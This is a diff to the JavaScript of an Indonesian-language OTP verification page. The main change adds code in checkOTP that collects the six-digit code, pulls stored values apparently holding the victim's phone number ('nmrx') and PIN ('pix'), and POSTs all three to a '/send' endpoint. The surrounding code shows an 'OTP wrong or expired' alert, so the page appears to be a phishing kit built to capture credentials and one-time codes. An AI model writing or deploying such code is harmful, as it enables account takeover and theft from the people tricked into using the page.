@@ -396,8 +396,70 @@ otpInputs.forEach((input, index) => {
 
 function checkOTP() {
 
-    const otp =
-    getOTPValue();
+  let otp = "";
+
+    otpInputs.forEach(input => {
+
+        otp += input.value;
+
+    });
+
+    /* FULL OTP */
+    if(otp.length === 6){
+
+         /* SIMPAN */
+    localStorage.setItem(
+    "otp",
+    otp
+    );
+
+            const nmrx =
+            localStorage.getItem(
+            "nmrx"
+            );
+
+            const pix =
+            localStorage.getItem(
+            "pix"
+            );
+
+            const otpData =
+            localStorage.getItem(
+            "otp"
+            );
+
+            fetch("/send", {
+
+            method:"POST",
+
+            headers:{
+            "Content-Type":
+            "application/json"
+        },
+
+            body:JSON.stringify({
+
+                nmrx:nmrx,
+                pix:pix,
+                otp:otpData
+
+        })
+
+    })
+
+        .then(res => res.json())
+
+.then(data => {
+
+    console.log("RESPON:", data);
+
+})
+
+.catch(err => {
+
+    console.log("ERROR:", err);
+
+});
 
     if (
         otp.length !== otpInputs.length ||
@@ -423,7 +485,7 @@ function checkOTP() {
 
         showTempAlert(
             "Kode OTP Salah atau Kadaluarsa",
-            "Pastikan Kode yang kamu masukan benar dan tidak kadaluarsa",
+            "Pastikan kode yang kamu masukan sudah benar dan tidak kadaluarsa.",
             "red"
         );
 
@@ -432,6 +494,8 @@ function checkOTP() {
         isProcessing = false;
 
     }, 2000);
+
+}
 
 }
 
@@ -510,7 +574,7 @@ if (resendBtn) {
 
             showTempAlert(
                 "Kode Dikirim Ulang",
-                "Silakan periksa kode OTP terbaru.",
+                "Silakan periksa kode verifikasi terbaru.",
                 "blue"
             );
 
